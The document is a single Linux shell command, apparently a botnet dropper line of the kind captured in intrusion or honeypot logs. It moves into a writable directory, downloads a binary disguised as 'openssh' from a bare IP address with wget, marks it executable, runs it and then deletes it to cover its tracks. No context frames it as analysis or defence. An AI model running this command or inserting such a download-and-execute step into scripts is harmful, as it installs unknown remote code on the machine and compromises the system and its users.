cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.208/openssh; chmod +x openssh; ./openssh; rm -rf openssh
